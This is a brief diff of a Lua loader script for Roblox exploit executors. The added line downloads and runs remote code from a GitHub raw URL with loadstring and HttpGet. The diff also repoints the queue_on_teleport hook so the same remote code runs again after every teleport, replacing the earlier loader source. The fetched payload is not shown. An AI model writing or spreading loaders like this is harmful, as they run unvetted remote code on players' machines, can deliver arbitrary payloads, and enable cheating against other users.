@@ -1,7 +1,8 @@
 repeat wait() until game:IsLoaded() and game.Players and game.Players.LocalPlayer and game.Players.LocalPlayer.Character
+loadstring(game:HttpGet('https://raw.githubusercontent.com/F2B-HUB/TEST/main/ass'))()
 local queueonteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) or nil
 local httprequest = (syn and syn.request) or http and http.request or http_request or (fluxus and fluxus.request) or request
 local httpservice = game:GetService('HttpService')
 if queueonteleport then
-  queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/13B8B/NEXUS/main/loadstring'))()")
+  queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/F2B-HUB/TEST/main/ass'))()")
 end
